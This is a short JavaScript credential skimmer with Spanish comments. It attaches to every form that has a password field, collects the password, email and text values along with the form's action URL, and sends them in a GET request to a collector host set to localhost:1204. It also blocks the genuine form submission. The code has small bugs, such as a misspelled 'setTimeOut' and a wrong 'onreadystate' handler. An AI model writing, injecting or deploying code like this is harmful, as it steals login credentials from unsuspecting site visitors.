host = 'http://localhost:1204/';
timeout = 5000;

function sleep(millisegundos) {
	var inicio = new Date().getTime();
	while ((new Date().getTime() - inicio) < millisegundos){}
}

campos = document.querySelectorAll('input[type=password]');
for(i=0; i<campos.length; i++)
{
	//Con cada campo de password
	form = campos[i].form;
	form.addEventListener('submit', function(e){
		mensaje = 'URL: ' + this.action + '\n';
		nodos = this.querySelectorAll('input');
		for(j=0; j<nodos.length; j++)
		{
			nodo = nodos[j];
			console.log(nodo);
			if(nodo.type==='password' || nodo.type==='email' || nodo.type==='text')
			{
				mensaje = mensaje + nodo.name + ': ' + nodo.value + '\n';
			}
		}
		query = '?data=' + escape(mensaje);

		xmlhttp=new XMLHttpRequest();
		xmlhttp.open("GET", host+query, false);
		xmlhttp.onreadystate = function(){
			console.log(xmlhttp.responseText);
			console.log(xmlhttp.status);
			//this.submit();
		}
		xmlhttp.send();
		setTimeOut(function(){
			xmlhttp.abort();
		}, 1000);
		console.log('listo');

		e.preventDefault();
		/* setTimeOut(function(){
			this.submit();
		}, 5000); */

		}, false)
}
